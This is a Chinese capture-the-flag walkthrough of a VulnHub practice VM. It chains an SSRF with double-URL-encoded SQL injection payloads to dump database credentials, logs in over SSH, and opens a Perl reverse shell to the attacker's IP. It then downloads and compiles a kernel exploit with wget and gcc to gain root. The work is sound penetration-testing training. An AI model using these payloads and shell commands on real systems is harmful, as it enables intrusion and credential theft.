**VulnHub项目介绍**

VulnHub是一个面向所有人开放的安全靶场，里面有好多安全环境，只要下载相关镜像，在相关虚拟机上面运行就可以练习相关靶场了。

**攻略目标**

获取根目录下flag执行最终的flag脚本

**使用工具**

1.firefox渗透测试版

2.kali linux

**环境准备**

1.下载地址：https://www.vulnhub.com/entry/6days-lab-11,156/#flags

2.下载好靶场之后，使用VirtualBox虚拟机软件导入环境，启动即可，为了方便练习，我将攻击机和靶场都设置为桥接模式

![](../Images/209c06df35a64b8fceb927ed0df9b54c.png)![](../Images/416accf98c22b18441bb4538b4eb0339.png)

**渗透攻略**

1.获取靶机ip地址

输入命令netdiscover，不添加任何参数，会默认扫描机器网卡上的ip值的所有网段，获取到靶场ip地址为192.168.1.103

![](../Images/a9b044be56ff979bdc963036ab24447d.png)

2.收集端口信息

输入命令，nmap -v -Pn -p- 192.168.1.103

\-v：表示显示详细信息

\-Pn：表示不使用ping扫描

\-p-：表示扫描指定ip的所有端口

![](../Images/1746de1d167bcb0081c73718b9616a33.png)

 如图所示，靶场开启了22,80,8080端口

3.进行渗透

访问192.168.1.103的80端口，是一个ips界面，还有一个折扣码

![](../Images/2fcbad291e77342ea673cbf1d20d2678.png)

 输入折扣码，提示代码过期，没啥用处

![](../Images/f8643ed92380aedc2d0cc52e91124970.png)

4.查看网站源码，发现image.php页面会进行引用图片

 ![](../Images/3fc0ef7fa743443b93755b19338b0ce6.png)

5.进行访问，可能存在ssrf

![](../Images/4a81ee5990897dc1e71675a931965b26.png)

6,修改src=后边参数为index.php，并没有拦截，也没有报错

![](../Images/1e70c6b25cd5f4809988278e57aa490a.png)

使用dirb http://192.168.1.103，获取靶机网站目录结构文件

![](../Images/c1f7738fb8880bc1120da555a7f69ad2.png)

7.打开BP进行抓包，发现响应包是主页界面

![](../Images/3199b84ae66b23f1285bcf92701fc4a9.png)

获取passwd文件信息，得到靶机有账户user,andrea

![](../Images/ce602001a556eae48b068314bfc4eb3b.png)

查看config.php信息，得到数据库账号，密码，数据库名信息

![](../Images/ba78303663ff6d79208eccd727e40eeb.png)

其他发现的网站界面都会被ips拦截

![](../Images/90a99609efcaa6cd4bd0cd93071ce9be.png)

8.查看apache默认配置信息

在apache默认文件中，发现网站实际就是在8080端口，只接受本地连接，然后转发到80端口

![](../Images/69aaf428417f16c59303ffa690d37d50.png)  

9.通过配置信息，获得的消息，可以发现网站直接跟mysql数据库连接，存在sql注入，两次url编码即可绕过

通过Python来生成sql语句

输入 python3  进入python3环境

![](../Images/d009c2a33218ee8f9b0414b954bbbb3d.png)

from urllib.parse import quote ，引入quote模块里的url编码

quote(quote("SQL语句"))，两次url编码sql语句

例如：quote(quote("aaaa'union select version(),2#"))，获取当前数据库版本信息

![](../Images/4ff59e5aedd80923d27dfeb3e1fc5529.png)

 payload:image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=aaaa%2527union%2520select%2520version%2528%2529%252C2%2523

![](../Images/9b46ad6b49dce02ce669be9b8b4d026b.png)

通过ssrf+sql注入，得到想要的信息

获取当前数据库payload:/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=aaaa%2527union%2520select%2520database%2528%2529%252C2%2523  
![](../Images/b1328b37f2961042592d3d44a33bb23e.png)

获取当前数据库中的表payload:/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=aaaa%2527union%2520select%2520group\_concat%2528table\_name%2529%252C2%2520from%2520information\_schema.tables%2520where%2520table\_schema%253Ddatabase%2528%2529%2523

![](../Images/15459c4f1ad7d01883d6bbe5e97e86d5.png)

获取表中字段名payload：/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=aaaa%2527union%2520select%2520group\_concat%2528column\_name%2529%252C2%2520from%2520information\_schema.columns%2520where%2520table\_schema%253Ddatabase%2528%2529%2520and%2520table\_name%253D%2527users%2527%2523

![](../Images/e8f1f299041fea5f8f6a81011cfcef44.png)

获取所需账号密码信息payload：/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=aaaa%2527union%2520select%2520group\_concat%2528username%252C%2527~~~~%2527%252Cpassword%2529%252C2%2520from%2520fancydb.users%2523

![](../Images/7fa15fa652a4bf7c5beb21b421643f93.png)

10.获取到andrea账户的密码信息，开启了ssh端口，尝试使用ssh进行连接

输入命令 ssh andrea@192.168.1.103 

之后输入密码，连接成功![](../Images/f0ecf8e14f42eb30eacb4c55432aeb72.png)

11.连接之后发现任何命令都没反应

![](../Images/ede20ecfd3091534fa74005700f33a19.png)

 12.可能是回显信息丢失，尝试反弹shell

攻击机重新打开一个终端，输入nc -lvvp 1234,监听本地端口

![](../Images/d147cd390fd3d2fbf82e50bf8c4aaf96.png)

ssh连接的靶机上输入命令：perl -e 'use Socket;$i="192.168.1.102";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

命令的i参数：后边的ip地址为自己攻击机主机的ip地址

 命令的p参数：后边为nc本地监听的端口

执行之后发现反弹命shell成功，命令也都有回显

![](../Images/7e5bcf24b25ce51f016b150c61091418.png)

如果觉得反弹的shell前边没东西不太习惯，可以在反弹的shell下输入以下命令，返回原始bash shell

python -c ’import pty; pty.spawn("/bin/bash")‘

![](../Images/9c582f26d0d568b2fb3acd4810816917.png)

13.进行提权

输入 uname -a，获取系统内核版本为3.13.0

![](../Images/ad4be9c2a50d33057c687f83cb7682f4.png)

搜索可用exp

输入命令 searchsploit 3.13.0，发现kali系统内置的exp脚本

![](../Images/6dc2cad37c7f688e7b4ccb20b36bbd00.png)

14.将可用脚本下载到靶机平台

首先开启攻击机的apache服务

 service apache2 start

![](../Images/735e4233910bb533000adc5afa11a6ac.png)

将脚本文件复制到apache根目录下

输入命令：cp /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/html/

![](../Images/146fe5728486de5208219e0c3abfbfbf.png)

在反弹的shell中下载脚本

输入命令，wget http://192.168.1.102/37292.c

![](../Images/d62363eec90e3969c67c8dc7c93eaa6c.png)

15.使用exp脚本文件进行提权

因为脚本文件为c语言编写的，使用需要进行编译，可以使用gcc进行编译

输入命令：gcc 37292.c -o exp

\-o 参数为输入的文件名称

![](../Images/d74606366c863b9fa39da0ab1b83c3fa.png)

编译之后的文件直接具备了可执行权限

输入命令：./exp，发现提权成功

![](../Images/64d8a7f69eeb7dc659aa5b36d7c2bc5c.png)

16.得到flag

提权成功之后，切换到系统根目录，发现flag文件，发现为可执行脚本，./flag执行，得到flag

![](../Images/d277b10c49d39b2656913af436d4db6f.png)
